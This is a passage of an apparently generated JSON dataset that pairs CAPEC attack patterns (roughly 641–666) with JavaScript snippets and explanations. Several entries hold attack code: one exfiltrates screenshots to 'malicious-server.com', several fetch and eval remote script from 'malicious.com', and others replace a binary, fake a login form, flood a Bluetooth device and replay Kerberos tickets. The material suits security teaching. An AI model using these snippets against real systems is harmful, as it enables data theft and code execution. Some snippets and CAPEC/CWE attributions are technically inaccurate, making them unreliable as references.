        "code_snippet": "const { exec } = require('child_process');\nconst path = require('path');\n\n// Vulnerable function that loads a DLL from an untrusted path\nfunction loadDLL(dllName) {\n  const dllPath = path.join(__dirname, dllName);\n  exec(`rundll32 ${dllPath},DllMain`, (error, stdout, stderr) => {\n    if (error) {\n      console.error(`Error loading DLL: ${error.message}`);\n      return;\n    }\n    console.log(`DLL loaded successfully: ${stdout}`);\n  });\n}\n\n// Example usage\nloadDLL('example.dll');",
        "description": "This JavaScript code snippet demonstrates a vulnerable function that loads a DLL from an untrusted path, embodying the main idea of the CAPEC 'DLL Side-Loading'. The function 'loadDLL' constructs a path to the DLL using the current directory and the provided DLL name, then uses the 'exec' function to run the 'rundll32' command to load the DLL. This approach is vulnerable to CWE-427 (Uncontrolled Search Path Element) and CWE-426 (Untrusted Search Path) because it does not verify the integrity or trustworthiness of the DLL being loaded. An attacker could place a malicious DLL in the same directory, leading to the execution of malicious code."
    },
    {
        "capec_id": "642",
        "capec_name": "Replace Binaries",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\nconst vulnerableBinaryPath = '/usr/local/bin/vulnerableBinary';\nconst maliciousBinaryPath = '/tmp/maliciousBinary';\n\n// Check if the vulnerable binary exists and has weak permissions\nif (fs.existsSync(vulnerableBinaryPath)) {\n  const stats = fs.statSync(vulnerableBinaryPath);\n  if ((stats.mode & 0o777) !== 0o755) { // Incorrect Permission Assignment (CWE-732)\n    // Replace the vulnerable binary with the malicious one\n    fs.copyFileSync(maliciousBinaryPath, vulnerableBinaryPath);\n    console.log('Vulnerable binary replaced with malicious binary.');\n  }\n}\n\n// Simulate execution of the binary\nconst exec = require('child_process').exec;\nexec(vulnerableBinaryPath, (error, stdout, stderr) => {\n  if (error) {\n    console.error(`Execution error: ${error}`);\n    return;\n  }\n  console.log(`Output: ${stdout}`);\n});",
        "description": "This JavaScript code snippet demonstrates a scenario where an adversary replaces a vulnerable binary with a malicious one due to weak file permissions. The code first checks if the vulnerable binary exists and if it has weak permissions (CWE-732). If the permissions are weak, it replaces the vulnerable binary with a malicious binary. Finally, it simulates the execution of the replaced binary, which could lead to the execution of malicious code with higher system permissions. This embodies the main idea of the CAPEC 'Replace Binaries' attack pattern."
    },
    {
        "capec_id": "643",
        "capec_name": "Identify Shared Files/Directories on System",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\n// Function to list shared directories\nfunction listSharedDirectories(basePath) {\n  try {\n    const files = fs.readdirSync(basePath);\n    files.forEach(file => {\n      const filePath = path.join(basePath, file);\n      const stats = fs.statSync(filePath);\n      if (stats.isDirectory()) {\n        console.log(`Shared Directory: ${filePath}`);\n        // Check for sensitive files\n        const sensitiveFiles = ['passwords.txt', 'config.json'];\n        sensitiveFiles.forEach(sensitiveFile => {\n          const sensitiveFilePath = path.join(filePath, sensitiveFile);\n          if (fs.existsSync(sensitiveFilePath)) {\n            console.log(`Sensitive file found: ${sensitiveFilePath}`);\n          }\n        });\n      }\n    });\n  } catch (err) {\n    console.error('Error reading directory:', err);\n  }\n}\n\n// Example usage\nlistSharedDirectories('\\\\UNC\\share\\name\\');",
        "description": "This JavaScript code snippet demonstrates how an adversary might identify shared directories on a system and search for sensitive files within those directories. The `listSharedDirectories` function takes a base path (in this case, a Windows UNC share path) and lists all directories within it. It then checks for the presence of specific sensitive files (e.g., 'passwords.txt', 'config.json') within each shared directory. This embodies the CAPEC idea of discovering connections between systems by identifying shared folders/drives and potentially locating sensitive information. The code also touches on related CWEs, such as CWE-40 (Path Traversal), CWE-552 (Files or Directories Accessible to External Parties), and CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor)."
    },
    {
        "capec_id": "644",
        "capec_name": "Use of Captured Hashes (Pass The Hash)",
        "code_snippet": "const crypto = require('crypto');\nconst net = require('net');\n\n// Simulate storing password hash\nconst storedHash = crypto.createHash('md5').update('password123').digest('hex');\n\n// Simulate receiving a hash from a client\nconst clientHash = '482c811da5d5b4bc6d497ffa98491e38'; // MD5 hash of 'password123'\n\n// Single-factor authentication using hash comparison\nfunction authenticate(hash) {\n  if (hash === storedHash) {\n    console.log('Authentication successful');\n  } else {\n    console.log('Authentication failed');\n  }\n}\n\n// Simulate network communication\nconst server = net.createServer((socket) => {\n  socket.on('data', (data) => {\n    const receivedHash = data.toString();\n    authenticate(receivedHash);\n  });\n});\n\nserver.listen(1337, '127.0.0.1');\n\n// Client sends captured hash\nconst client = new net.Socket();\nclient.connect(1337, '127.0.0.1', () => {\n  client.write(clientHash);\n  client.end();\n});",
        "description": "This JavaScript code snippet demonstrates a vulnerable authentication mechanism that uses password hashes for single-factor authentication. The server stores an MD5 hash of a password and compares it with a hash received from a client. The client sends a captured hash over the network, which the server accepts if it matches the stored hash. This embodies the 'Use of Captured Hashes (Pass The Hash)' attack described in the CAPEC, highlighting weaknesses such as 'Insufficiently Protected Credentials' (CWE-522), 'Use of Password Hash Instead of Password for Authentication' (CWE-836), 'Use of Single-factor Authentication' (CWE-308), and 'Authentication Bypass by Capture-replay' (CWE-294)."
    },
    {
        "capec_id": "645",
        "capec_name": "Use of Captured Tickets (Pass The Ticket)",
        "code_snippet": "const net = require('net');\n\n// Simulate a captured Kerberos ticket\nconst capturedTicket = 'captured_ticket_data';\n\n// Create a client to replay the captured ticket\nconst client = new net.Socket();\nclient.connect(88, 'target_kerberos_server', () => {\n  console.log('Connected to Kerberos server');\n  // Send the captured ticket to the server\n  client.write(capturedTicket);\n});\n\nclient.on('data', (data) => {\n  console.log('Received: ' + data);\n  client.destroy(); // Close the connection\n});\n\nclient.on('close', () => {\n  console.log('Connection closed');\n});",
        "description": "This JavaScript code snippet demonstrates a simplified version of a 'Pass The Ticket' attack. It uses the 'net' module to create a TCP client that connects to a Kerberos server on port 88. The client sends a captured Kerberos ticket to the server, simulating an authentication attempt using stolen credentials. This embodies the main idea of CAPEC-639, where an adversary uses stolen Kerberos tickets to access systems. The code also touches on related CWEs, such as CWE-522 (Insufficiently Protected Credentials) by using a captured ticket, CWE-294 (Authentication Bypass by Capture-replay) by replaying the ticket, and CWE-308 (Use of Single-factor Authentication) by relying solely on the ticket for authentication."
    },
    {
        "capec_id": "646",
        "capec_name": "Peripheral Footprinting",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\n// Function to check for USB device connections by reading Windows registry\nfunction checkUSBDevices() {\n  const registryPath = 'C:\\\\Windows\\\\System32\\\\config\\\\SYSTEM';\n  try {\n    const data = fs.readFileSync(registryPath, 'utf8');\n    if (data.includes('USBSTOR')) {\n      console.log('USB device detected');\n    } else {\n      console.log('No USB device detected');\n    }\n  } catch (err) {\n    console.error('Error reading registry:', err);\n  }\n}\n\n// Function to search for iOS backups\nfunction searchIOSBackups() {\n  const backupPath = path.join(process.env.HOME || process.env.USERPROFILE, 'AppData', 'Roaming', 'Apple Computer', 'MobileSync', 'Backup');\n  try {\n    if (fs.existsSync(backupPath)) {\n      console.log('iOS backup found');\n    } else {\n      console.log('No iOS backup found');\n    }\n  } catch (err) {\n    console.error('Error searching for iOS backups:', err);\n  }\n}\n\n// Execute functions\ncheckUSBDevices();\nsearchIOSBackups();",
        "description": "This JavaScript code snippet demonstrates how an adversary might attempt to obtain information about attached peripheral devices and components connected to a computer system, embodying the main idea of the CAPEC 'Peripheral Footprinting'. The `checkUSBDevices` function reads the Windows registry to detect connected USB devices, which relates to CWE-497 (Exposure of Sensitive System Information to an Unauthorized Control Sphere). The `searchIOSBackups` function searches for iOS backups in the user's directory, which can expose sensitive information (CWE-200). Both functions attempt to access sensitive information without proper authorization, highlighting potential vulnerabilities in handling system-level information."
    },
    {
        "capec_id": "647",
        "capec_name": "Collect Data from Registries",
        "code_snippet": "const registry = require('winreg');\n\nfunction readRegistryKey(keyPath) {\n  const regKey = new registry({\n    hive: registry.HKLM, // Hive can be HKCU, HKLM, etc.\n    key: keyPath\n  });\n\n  regKey.values((err, items) => {\n    if (err) {\n      console.error('Error reading registry:', err);\n    } else {\n      items.forEach((item) => {\n        console.log(`${item.name}: ${item.value}`);\n      });\n    }\n  });\n}\n\n// Example usage\nreadRegistryKey('SOFTWARE\\Example');",
        "description": "This JavaScript code snippet demonstrates how to read values from the Windows Registry using the 'winreg' module. The function 'readRegistryKey' takes a registry key path as an argument and reads all values under that key. The code does not perform any authorization checks, which embodies CWE-285 (Improper Authorization). Additionally, it assumes that sensitive information might be stored in cleartext (CWE-314) and does not implement proper access control (CWE-1262). This can lead to exposure of sensitive system information (CWE-497). The code represents the main idea of CAPEC-Collect Data from Registries, where an adversary can exploit these weaknesses to gather sensitive information from the registry."
    },
    {
        "capec_id": "648",
        "capec_name": "Collect Data from Screen Capture",
        "code_snippet": "const captureScreen = async () => {\n  try {\n    const stream = await navigator.mediaDevices.getDisplayMedia({ video: true });\n    const videoTrack = stream.getVideoTracks()[0];\n    const imageCapture = new ImageCapture(videoTrack);\n    const bitmap = await imageCapture.grabFrame();\n    const canvas = document.createElement('canvas');\n    canvas.width = bitmap.width;\n    canvas.height = bitmap.height;\n    const context = canvas.getContext('2d');\n    context.drawImage(bitmap, 0, 0, canvas.width, canvas.height);\n    const screenshot = canvas.toDataURL('image/png');\n    // Transmit screenshot in cleartext (CWE-319)\n    fetch('http://malicious-server.com/upload', {\n      method: 'POST',\n      headers: { 'Content-Type': 'application/json' },\n      body: JSON.stringify({ image: screenshot })\n    });\n  } catch (err) {\n    console.error('Error capturing screen:', err);\n  }\n};\n\n// Trigger screen capture\ncaptureScreen();",
        "description": "This JavaScript code snippet demonstrates how an adversary could exploit the screen capture functionality to gather sensitive information. The `captureScreen` function uses the `navigator.mediaDevices.getDisplayMedia` API to capture the screen. It then converts the captured screen into an image and transmits it to a malicious server in cleartext (CWE-319). This embodies the main idea of CAPEC-Collect Data from Screen Capture, where an adversary gathers sensitive information through screen capture. The code also highlights CWE-497 by exposing sensitive system information to an unauthorized control sphere and CWE-319 by transmitting sensitive data in cleartext."
    },
    {
        "capec_id": "649",
        "capec_name": "Adding a Space to a File Extension",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\nfunction uploadFile(filePath) {\n  // Check if the file extension is .txt\n  if (path.extname(filePath) === '.txt ') {\n    console.log('File extension is .txt with trailing space');\n    // Process the file assuming it's a text file\n    fs.readFile(filePath, 'utf8', (err, data) => {\n      if (err) throw err;\n      console.log('File content:', data);\n    });\n  } else {\n    console.log('File extension is not .txt');\n  }\n}\n\n// Example usage\nuploadFile('example.txt ');",
        "description": "This JavaScript code snippet demonstrates a vulnerability where a file with a trailing space in its extension is misclassified. The `uploadFile` function checks if the file extension is `.txt ` (with a trailing space) and processes it as a text file. This can be exploited by an attacker to upload a malicious file disguised as a text file. The code highlights the issue of relying on file extensions for determining file types, which is related to CWE-646. Additionally, it shows how trailing spaces in file names (CWE-46) can lead to improper handling and potential security risks."
    },
    {
        "capec_id": "650",
        "capec_name": "Upload a Web Shell to a Web Server",
        "code_snippet": "const express = require('express');\nconst fileUpload = require('express-fileupload');\nconst app = express();\nconst path = require('path');\n\napp.use(fileUpload());\n\napp.post('/upload', (req, res) => {\n  if (!req.files || Object.keys(req.files).length === 0) {\n    return res.status(400).send('No files were uploaded.');\n  }\n\n  let uploadedFile = req.files.file;\n  let uploadPath = path.join(__dirname, 'uploads', uploadedFile.name);\n\n  // CWE-434: Unrestricted Upload of File with Dangerous Type\n  uploadedFile.mv(uploadPath, (err) => {\n    if (err) return res.status(500).send(err);\n    res.send('File uploaded!');\n  });\n});\n\napp.listen(3000, () => {\n  console.log('Server started on http://localhost:3000');\n});",
        "description": "This JavaScript code snippet uses the Express framework to create a simple web server that allows file uploads. The server listens for POST requests at the '/upload' endpoint. When a file is uploaded, it is saved to the 'uploads' directory without any validation or restriction on the file type (CWE-434: Unrestricted Upload of File with Dangerous Type). This lack of validation can be exploited to upload a web shell, which can then be executed remotely, embodying the main idea of the CAPEC 'Upload a Web Shell to a Web Server'. The code does not implement proper authentication (CWE-287) or server-side security enforcement (CWE-602), making it vulnerable to attacks."
    },
    {
        "capec_id": "651",
        "capec_name": "Eavesdropping",
        "code_snippet": "const http = require('http');\nconst fs = require('fs');\n\nhttp.createServer((req, res) => {\n  if (req.url === '/record') {\n    const audioStream = fs.createWriteStream('recorded_audio.wav');\n    req.pipe(audioStream);\n    res.writeHead(200, {'Content-Type': 'text/plain'});\n    res.end('Recording started');\n  } else if (req.url === '/playback') {\n    fs.readFile('recorded_audio.wav', (err, data) => {\n      if (err) {\n        res.writeHead(500, {'Content-Type': 'text/plain'});\n        res.end('Error reading file');\n      } else {\n        res.writeHead(200, {'Content-Type': 'audio/wav'});\n        res.end(data);\n      }\n    });\n  } else {\n    res.writeHead(404, {'Content-Type': 'text/plain'});\n    res.end('Not Found');\n  }\n}).listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});",
        "description": "This JavaScript code snippet creates a simple HTTP server using Node.js that can record audio data sent to the '/record' endpoint and save it to a file named 'recorded_audio.wav'. The '/playback' endpoint allows the recorded audio to be played back. This code embodies the concept of eavesdropping (CAPEC-173) by capturing and storing audio data without any encryption or authentication, making it vulnerable to unauthorized access (CWE-200, CWE-319). The recorded audio is stored in a file, which can be considered a covert storage channel (CWE-515). The lack of proper protection mechanisms (CWE-1300) makes it easy for an adversary to gain access to sensitive information."
    },
    {
        "capec_id": "652",
        "capec_name": "Use of Known Kerberos Credentials",
        "code_snippet": "const kerberos = require('kerberos');\nconst fs = require('fs');\n\n// Load known Kerberos credentials from a file (CWE-522)\nconst credentials = JSON.parse(fs.readFileSync('credentials.json', 'utf8'));\n\n// Function to authenticate using Kerberos credentials\nfunction authenticate(user, password) {\n  kerberos.initializeClient(`user@DOMAIN.COM`, { user, password }, (err, client) => {\n    if (err) {\n      console.error('Authentication failed:', err);\n      return;\n    }\n    console.log('Authenticated successfully');\n    // Access additional systems or services\n    accessService(client);\n  });\n}\n\n// Simulate an attacker using known credentials (CWE-522, CWE-309)\ncredentials.forEach(cred => {\n  authenticate(cred.user, cred.password);\n});\n\nfunction accessService(client) {\n  // Placeholder function to represent accessing a service\n  console.log('Accessing service with client:', client);\n}",
        "description": "This JavaScript code snippet demonstrates the use of known Kerberos credentials to authenticate and access additional systems or services. The credentials are loaded from a file (CWE-522), and the `authenticate` function uses these credentials to initialize a Kerberos client. If authentication is successful, it proceeds to access a service. This code embodies the main idea of CAPEC-Use of Known Kerberos Credentials by showing how an adversary might use stolen or purchased credentials to gain authenticated access. The code also highlights related weaknesses such as insufficiently protected credentials (CWE-522) and reliance on password systems for primary authentication (CWE-309)."
    },
    {
        "capec_id": "653",
        "capec_name": "Use of Known Operating System Credentials",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst bodyParser = require('body-parser');\nconst users = { 'admin': 'password123' }; // CWE-522: Insufficiently Protected Credentials\n\napp.use(bodyParser.json());\n\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  if (users[username] && users[username] === password) {\n    // CWE-308: Use of Single-factor Authentication\n    res.send('Login successful');\n  } else {\n    res.status(401).send('Login failed');\n  }\n});\n\napp.listen(3000, () => {\n  console.log('Server running on port 3000');\n});",
        "description": "This JavaScript code snippet sets up a simple Express server with a login endpoint. The credentials are stored in plain text within the code (CWE-522: Insufficiently Protected Credentials). The authentication mechanism relies on single-factor authentication (CWE-308: Use of Single-factor Authentication), where only a username and password are required. This setup embodies the main idea of CAPEC-Use of Known Operating System Credentials, as an adversary could easily guess or obtain these credentials to gain unauthorized access. The code does not implement measures to prevent multiple failed authentication attempts (CWE-307), nor does it use multi-factor authentication (CWE-654)."
    },
    {
        "capec_id": "654",
        "capec_name": "Credential Prompt Impersonation",
        "code_snippet": "document.addEventListener('DOMContentLoaded', function() {\n  // Create a fake login form\n  var fakeForm = document.createElement('form');\n  fakeForm.innerHTML = `\n    <label for='username'>Username:</label>\n    <input type='text' id='username' name='username'><br>\n    <label for='password'>Password:</label>\n    <input type='password' id='password' name='password'><br>\n    <input type='submit' value='Login'>\n  `;\n  fakeForm.onsubmit = function(event) {\n    event.preventDefault();\n    var username = document.getElementById('username').value;\n    var password = document.getElementById('password').value;\n    // Log credentials to console (simulating theft)\n    console.log('Stolen Credentials:', username, password);\n  };\n  // Append the fake form to the body\n  document.body.appendChild(fakeForm);\n});",
        "description": "This JavaScript code snippet demonstrates a basic example of 'Credential Prompt Impersonation' (CAPEC-1021). When the DOM content is loaded, it creates a fake login form and appends it to the body of the document. When the form is submitted, it prevents the default form submission behavior and logs the entered credentials to the console, simulating credential theft. This example also touches on related CWEs: 'Improper Restriction of Rendered UI Layers or Frames' (CWE-1021) by overlaying a fake UI, 'Insufficiently Protected Credentials' (CWE-522) by logging credentials in plain text, and 'Use of Weak Credentials' (CWE-1391) by not enforcing any password strength requirements."
    },
    {
        "capec_id": "655",
        "capec_name": "Avoid Security Tool Identification by Adding Data",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\n// Function to add data to a file to avoid security tool detection\nfunction addDataToFile(filePath, data) {\n  try {\n    // Read the original file content\n    let fileContent = fs.readFileSync(filePath, 'utf8');\n    \n    // Add data to the file to increase its size\n    fileContent += data;\n    \n    // Write the modified content back to the file\n    fs.writeFileSync(filePath, fileContent, 'utf8');\n    console.log('Data added to file successfully.');\n  } catch (err) {\n    console.error('Error adding data to file:', err);\n  }\n}\n\n// Example usage\nconst filePath = path.join(__dirname, 'example.txt');\nconst additionalData = 'A'.repeat(1024 * 1024); // 1MB of data\naddDataToFile(filePath, additionalData);",
        "description": "This JavaScript code snippet demonstrates how an adversary might add data to a file to increase its size, thereby attempting to avoid detection by security tools. The `addDataToFile` function reads the content of a specified file, appends additional data to it, and writes the modified content back to the file. This process changes the file's hash and increases its size, potentially bypassing security tools that rely on file size limits or known hashes for detection. The example usage shows how to add 1MB of data to a file named 'example.txt'. This code embodies the main idea of the CAPEC by manipulating file size and hash to evade security measures, while also touching on related CWEs by potentially including sensitive information in the file and relying on file names or extensions."
    },
    {
        "capec_id": "656",
        "capec_name": "Voice Phishing",
        "code_snippet": "const http = require('http');\nconst url = require('url');\n\nconst server = http.createServer((req, res) => {\n  const queryObject = url.parse(req.url, true).query;\n  const phoneNumber = queryObject.phone;\n  const sensitiveInfo = queryObject.info;\n\n  if (!phoneNumber || !sensitiveInfo) {\n    res.writeHead(400, {'Content-Type': 'text/plain'});\n    res.end('Bad Request');\n    return;\n  }\n\n  // Simulate a voice phishing attack\n  console.log(`Calling ${phoneNumber} to solicit sensitive information...`);\n  console.log(`Sensitive Information: ${sensitiveInfo}`);\n\n  res.writeHead(200, {'Content-Type': 'text/plain'});\n  res.end('Information received');\n});\n\nserver.listen(8080, () => {\n  console.log('Server is listening on port 8080');\n});",
        "description": "This JavaScript code snippet sets up a basic HTTP server that simulates a voice phishing attack. The server listens for incoming requests containing a phone number and sensitive information as query parameters. It then logs these details, mimicking the process of an adversary calling a victim to solicit sensitive information. The code embodies the main idea of CAPEC-165 (Voice Phishing) by demonstrating how an attacker might collect sensitive information via a voice call. The related CWEs are represented as follows: CWE-940 (Improper Verification of Source of a Communication Channel) is shown by the lack of verification of the request's origin, CWE-522 (Insufficiently Protected Credentials) is implied by the transmission of sensitive information in query parameters, and CWE-359 (Exposure of Private Personal Information to an Unauthorized Actor) is demonstrated by logging sensitive information without proper authorization checks."
    },
    {
        "capec_id": "657",
        "capec_name": "Malicious Automated Software Update via Spoofing",
        "code_snippet": "const updateUrl = 'https://malicious.example.com/update';\n\nfunction checkForUpdates() {\n  fetch(updateUrl)\n    .then(response => response.text())\n    .then(data => {\n      if (data.includes('update available')) {\n        downloadAndUpdate(data);\n      }\n    })\n    .catch(error => console.error('Error fetching update:', error));\n}\n\nfunction downloadAndUpdate(updateData) {\n  const script = document.createElement('script');\n  script.src = updateData;\n  document.body.appendChild(script);\n}\n\n// Simulate an automatic update check\ncheckForUpdates();",
        "description": "This JavaScript code snippet demonstrates a malicious automated software update via spoofing. The `checkForUpdates` function fetches update information from a malicious URL (`https://malicious.example.com/update`). If the response indicates an update is available, the `downloadAndUpdate` function is called, which dynamically creates a script element and sets its source to the malicious update data. This script is then appended to the document body, executing the malicious code. This example embodies the CAPEC by showing how an attacker can trick a client into downloading and executing malicious updates. The code also reflects related CWEs, such as downloading code without integrity checks (CWE-494), embedding malicious code (CWE-506), and improper client-side enforcement of security (CWE-602)."
    },
    {
        "capec_id": "660",
        "capec_name": "Root/Jailbreak Detection Evasion via Hooking",
        "code_snippet": "const fs = require('fs');\nconst http = require('http');\n\n// CWE-494: Download of Code Without Integrity Check\nhttp.get('http://malicious.com/malicious_code.js', (res) => {\n  let data = '';\n  res.on('data', (chunk) => { data += chunk; });\n  res.on('end', () => {\n    // CWE-829: Inclusion of Functionality from Untrusted Control Sphere\n    eval(data); // Dangerous: executing downloaded code without validation\n  });\n});\n\n// Function to check for Root/Jailbreak (simplified example)\nfunction isRooted() {\n  try {\n    fs.accessSync('/system/app/Superuser.apk');\n    return true;\n  } catch (e) {\n    return false;\n  }\n}\n\n// CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\nif (isRooted()) {\n  console.log('Device is rooted');\n} else {\n  console.log('Device is not rooted');\n}\n\n// CWE-939: Improper Authorization in Handler for Custom URL Scheme\nfunction handleCustomURL(url) {\n  if (url.startsWith('myapp://')) {\n    // No proper authorization check\n    console.log('Handling custom URL:', url);\n  }\n}\n\n// CWE-78: OS Command Injection\nconst exec = require('child_process').exec;\nfunction runCommand(cmd) {\n  exec(cmd, (error, stdout, stderr) => {\n    if (error) {\n      console.error(`exec error: ${error}`);\n      return;\n    }\n    console.log(`stdout: ${stdout}`);\n    console.error(`stderr: ${stderr}`);\n  });\n}\n\n// Example usage\nhandleCustomURL('myapp://doSomething');\nrunCommand('ls');",
        "description": "This JavaScript code snippet demonstrates several vulnerabilities related to the CAPEC 'Root/Jailbreak Detection Evasion via Hooking' and associated CWEs. The code downloads and executes code from an untrusted source without integrity checks (CWE-494, CWE-829), checks for Root/Jailbreak status and exposes this information (CWE-497), handles a custom URL scheme without proper authorization (CWE-939), and includes a function that can be exploited for OS command injection (CWE-78). This snippet highlights how an adversary could exploit these weaknesses to evade Root/Jailbreak detection and execute arbitrary code."
    },
    {
        "capec_id": "661",
        "capec_name": "Root/Jailbreak Detection Evasion via Debugging",
        "code_snippet": "function checkRoot() {\n  // Debugging code left active\n  if (typeof window.__DEBUG__ !== 'undefined' && window.__DEBUG__) {\n    console.log('Debug mode is active');\n    // Exposing sensitive system information\n    console.log('Sensitive Info: ', getSensitiveInfo());\n  }\n\n  // Root/Jailbreak detection\n  try {\n    if (window.navigator.userAgent.includes('rooted') || window.navigator.userAgent.includes('jailbroken')) {\n      throw new Error('Device is rooted or jailbroken');\n    }\n  } catch (e) {\n    console.error(e.message);\n    // Improper management of sensitive trace data\n    sendTraceData(e.message);\n  }\n}\n\nfunction getSensitiveInfo() {\n  // Simulate retrieval of sensitive information\n  return 'Sensitive System Data';\n}\n\nfunction sendTraceData(data) {\n  // Simulate sending trace data to an untrusted agent\n  console.log('Sending trace data: ', data);\n}\n\ncheckRoot();",
        "description": "This JavaScript code snippet demonstrates a scenario where an adversary can evade Root/Jailbreak detection by leveraging active debugging code. The `checkRoot` function checks if debugging is enabled and logs sensitive information if it is. It also attempts to detect if the device is rooted or jailbroken by inspecting the user agent string. If such a condition is detected, an error is thrown, and sensitive trace data is sent to an untrusted agent. This snippet embodies the main idea of CAPEC by showing how active debug code and improper management of sensitive information can be exploited to bypass security mechanisms."
    },
    {
        "capec_id": "662",
        "capec_name": "Adversary in the Browser (AiTB)",
        "code_snippet": "const downloadAndExecute = async (url) => {\n  try {\n    const response = await fetch(url);\n    if (!response.ok) throw new Error('Network response was not ok');\n    const scriptText = await response.text();\n    eval(scriptText); // CWE-494: Download of Code Without Integrity Check\n  } catch (error) {\n    console.error('Failed to download and execute script:', error);\n  }\n};\n\nconst manipulateTraffic = () => {\n  const originalFetch = window.fetch;\n  window.fetch = async (input, init) => {\n    if (input.includes('sensitiveEndpoint')) {\n      console.log('Intercepted request to sensitive endpoint:', input);\n      // CWE-300: Channel Accessible by Non-Endpoint\n    }\n    return originalFetch(input, init);\n  };\n};\n\nmanipulateTraffic();\ndownloadAndExecute('http://malicious.com/maliciousScript.js');",
        "description": "This JavaScript code snippet demonstrates an 'Adversary in the Browser (AiTB)' attack by exploiting several security weaknesses. The `downloadAndExecute` function fetches and executes a script from a remote URL without verifying its integrity (CWE-494). The `manipulateTraffic` function intercepts and logs requests to a sensitive endpoint, demonstrating how an adversary can manipulate traffic between endpoints (CWE-300). This code represents the main idea of CAPEC by showing how an attacker can exploit browser vulnerabilities to manipulate communication and execute malicious code."
    },
    {
        "capec_id": "663",
        "capec_name": "Exploitation of Transient Instruction Execution",
        "code_snippet": "function vulnerableFunction(secret) {\n  let publicData = new Array(100).fill(0);\n  let temp = 0;\n  for (let i = 0; i < 100; i++) {\n    if (i === secret) {\n      temp = publicData[i];\n    }\n  }\n  return temp;\n}\n\nfunction exploit() {\n  let secret = 42; // Assume this is a sensitive value\n  let leakedData = vulnerableFunction(secret);\n  console.log('Leaked Data:', leakedData);\n}\n\nexploit();",
        "description": "This JavaScript code snippet demonstrates a simplified version of a transient execution attack. The `vulnerableFunction` takes a secret value and uses it in a conditional check within a loop. Due to speculative execution, the CPU might execute the `temp = publicData[i]` line even if `i !== secret`, potentially exposing the secret value through side-channel effects. The `exploit` function calls `vulnerableFunction` with a sensitive value and logs the 'leaked' data, simulating how an attacker might exploit transient execution to access restricted information. This example embodies the main idea of CAPEC-Exploitation of Transient Instruction Execution and highlights related CWEs such as non-transparent sharing of microarchitectural resources and exposure of sensitive information during transient execution."
    },
    {
        "capec_id": "664",
        "capec_name": "Server Side Request Forgery",
        "code_snippet": "const http = require('http');\nconst url = require('url');\n\nhttp.createServer((req, res) => {\n  const queryObject = url.parse(req.url, true).query;\n  const targetUrl = queryObject.target;\n\n  if (!targetUrl) {\n    res.writeHead(400, {'Content-Type': 'text/plain'});\n    res.end('Bad Request: target URL is missing');\n    return;\n  }\n\n  http.get(targetUrl, (response) => {\n    let data = '';\n    response.on('data', (chunk) => {\n      data += chunk;\n    });\n    response.on('end', () => {\n      res.writeHead(200, {'Content-Type': 'text/plain'});\n      res.end(data);\n    });\n  }).on('error', (err) => {\n    res.writeHead(500, {'Content-Type': 'text/plain'});\n    res.end('Internal Server Error');\n  });\n}).listen(8080, () => {\n  console.log('Server is listening on port 8080');\n});",
        "description": "This JavaScript code snippet creates an HTTP server using Node.js. The server listens for incoming requests and extracts a 'target' URL parameter from the query string. It then makes an HTTP GET request to the specified target URL and returns the response to the client. This code is vulnerable to Server-Side Request Forgery (SSRF) because it does not validate the 'target' URL parameter, allowing an attacker to make the server send requests to internal or external services. This can lead to unauthorized access to sensitive data or services. The code also demonstrates improper input validation (CWE-20) and external control of assumed-immutable web parameters (CWE-472)."
    },
    {
        "capec_id": "665",
        "capec_name": "Exploitation of Thunderbolt Protection Flaws",
        "code_snippet": "const thunderboltController = require('thunderbolt-controller');\nconst spiDevice = require('spi-device');\n\n// CWE-1188: Insecure default initialization\nlet authEnabled = false; // Default insecure setting\n\n// CWE-345: Insufficient verification of data authenticity\nfunction verifyData(data) {\n  // Insecure verification\n  return data !== null;\n}\n\n// CWE-353: Missing support for integrity check\nfunction transmitData(data) {\n  // No integrity check\n  spiDevice.write(data);\n}\n\n// CWE-288: Authentication bypass using an alternate path\nfunction authenticate(user) {\n  if (user === 'admin') {\n    return true;\n  }\n  // Bypass authentication\n  return true;\n}\n\n// CWE-862: Missing authorization\nfunction accessResource(resource) {\n  // No authorization check\n  return resource;\n}\n\n// Exploit Thunderbolt protection flaws\nfunction exploitThunderbolt() {\n  if (!authEnabled) {\n    let data = thunderboltController.readSPI();\n    if (verifyData(data)) {\n      let modifiedData = manipulateData(data);\n      transmitData(modifiedData);\n      let resource = accessResource('sensitiveData');\n      console.log('Exploited data:', resource);\n    }\n  }\n}\n\nfunction manipulateData(data) {\n  // Manipulate data for exploitation\n  return data + ' manipulated';\n}\n\nexploitThunderbolt();",
        "description": "This JavaScript code snippet demonstrates a simplified version of exploiting Thunderbolt protection flaws by leveraging several common weaknesses (CWEs). The code initializes an insecure default setting (CWE-1188), performs insufficient verification of data authenticity (CWE-345), transmits data without integrity checks (CWE-353), bypasses authentication (CWE-288), and accesses resources without authorization checks (CWE-862). The `exploitThunderbolt` function simulates the exploitation process by reading, manipulating, and transmitting data through the Thunderbolt controller, ultimately accessing and logging sensitive data without proper security measures."
    },
    {
        "capec_id": "666",
        "capec_name": "BlueSmacking",
        "code_snippet": "const bluetooth = require('bluetooth');\n\nfunction floodBluetoothDevice(deviceAddress) {\n  const largePacket = Buffer.alloc(1024 * 1024, 'A'); // 1MB packet filled with 'A'\n  const socket = new bluetooth.Socket();\n\n  socket.connect(deviceAddress, () => {\n    console.log('Connected to device:', deviceAddress);\n    setInterval(() => {\n      socket.write(largePacket);\n      console.log('Sent large packet to', deviceAddress);\n    }, 100); // Flood every 100ms\n  });\n\n  socket.on('error', (err) => {\n    console.error('Connection error:', err);\n  });\n}\n\nconst targetDevice = '00:11:22:33:44:55'; // Example Bluetooth address\nfloodBluetoothDevice(targetDevice);",
        "description": "This JavaScript code snippet demonstrates a Bluetooth flooding attack, known as BlueSmacking, which aims to create a Denial of Service (DoS) on a Bluetooth-enabled device. The code uses the 'bluetooth' module to connect to a target device and repeatedly sends large packets (1MB in size) at short intervals (every 100ms). This flooding can overwhelm the target device's resources, leading to a DoS condition. The code also includes basic error handling for connection issues. The related CWEs provide context for potential weaknesses, such as improper resource shutdown (CWE-404) and cleartext transmission (CWE-319), which could be exploited in a real-world scenario."
    },
    {
        "capec_id": "667",
